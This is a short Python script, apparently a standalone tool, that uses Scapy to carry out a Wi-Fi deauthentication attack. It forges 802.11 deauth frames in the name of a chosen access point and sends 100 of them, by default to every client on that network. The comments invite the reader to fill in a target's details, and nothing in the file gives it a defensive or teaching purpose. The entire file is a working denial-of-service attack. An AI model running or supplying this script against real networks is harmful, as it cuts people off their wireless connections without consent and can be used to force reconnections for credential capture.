from scapy.all import *
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def deauth_attack(target_bssid, client_mac, interface, count=100):
    """
    Performs a deauthentication attack against a client on a specific BSSID.
    """
    try:
        dot11 = Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid)
        packet = RadioTap()/dot11/Dot11Deauth(reason=7)
        sendp(packet, iface=interface, count=count, inter=0.1, verbose=False)
        logging.info(f"Sent {count} deauthentication packets to {client_mac} on {target_bssid}")
    except Exception as e:
        logging.error(f"An error occurred during the deauthentication attack: {e}")

if __name__ == '__main__':
    # Replace with your target's information
    target_bssid = "00:11:22:33:44:55"
    client_mac = "FF:FF:FF:FF:FF:FF"  # Broadcast
    interface = "wlan0"
    deauth_attack(target_bssid, client_mac, interface)
